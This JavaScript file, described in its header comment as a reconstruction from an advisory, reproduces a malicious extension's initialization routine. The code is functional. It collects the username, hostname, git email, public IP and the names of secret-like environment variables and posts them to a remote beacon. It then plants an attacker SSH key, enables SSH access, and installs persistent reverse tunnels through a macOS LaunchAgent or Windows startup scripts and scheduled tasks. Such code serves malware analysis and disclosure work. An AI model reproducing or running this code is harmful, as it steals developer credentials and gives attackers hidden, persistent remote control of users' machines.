// Representative reconstruction from CA-26-045; not original extension bytes.
const fs = require('fs');
const os = require('os');
const path = require('path');
const cp = require('child_process');
const http = require('http');
async function initialize() {
  const loginName = os.userInfo().username;
  const machineName = os.hostname();
  const mail = cp.execSync('git config user.email').toString().trim();
  const inventory = Object.keys(process.env).filter((probe) => /KEY|PASSWORD|TOKEN|SECRET/i.test(probe)).slice(0, 17);
  const publicIp = await (await fetch('https://api.ipify.org')).text();
  const payload = JSON.stringify({machineName, loginName, mail, publicIp, inventory});
  const request = http.request({hostname: '192.0.2.73', port: 49281, path: '/beacon', method: 'POST', headers: {'Content-Type': 'application/json'} });
  request.on('error', () => {});
  request.end(payload);
  fs.mkdirSync(path.join(os.homedir(), '.ssh'), {recursive: true});
  fs.appendFileSync(path.join(os.homedir(), '.ssh', 'authorized_keys'), 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAABAgMEBQYHCAkKCwwNDg8QERITFBUWFxgZGhscHR4f rotation-key\n');
  const tunnel = 'while true; do ssh -N -R 49281:localhost:22 relay-user@192.0.2.73; sleep 97; done';
  if (process.platform === 'darwin') {
    cp.execSync('systemsetup -setremotelogin on');
    const agent = path.join(os.homedir(), 'Library', 'LaunchAgents', 'org.example.helper.plist');
    fs.writeFileSync(agent, `<?xml version="1.0"?><plist version="1.0"><dict><key>Label</key><string>org.example.helper</string><key>RunAtLoad</key><true/><key>StartInterval</key><integer>97</integer><key>ProgramArguments</key><array><string>/bin/sh</string><string>-c</string><string>${tunnel}</string></array></dict></plist>`);
    cp.execSync('launchctl load "' + agent + '"');
  } else if (process.platform === 'win32') {
    cp.execSync('powershell -Command "Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; Start-Service sshd"');
    const entry = path.join(process.env.APPDATA, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'refresh.cmd');
    fs.writeFileSync(entry, '@echo off\r\n:retry\r\nssh -N -R 49281:localhost:22 relay-user@192.0.2.73\r\ntimeout /t 60\r\ngoto retry\r\n');
    cp.execSync('schtasks /Create /TN UpdateService /SC MINUTE /MO 1 /TR "' + entry + '" /F');
  }
}
initialize().catch(() => {});
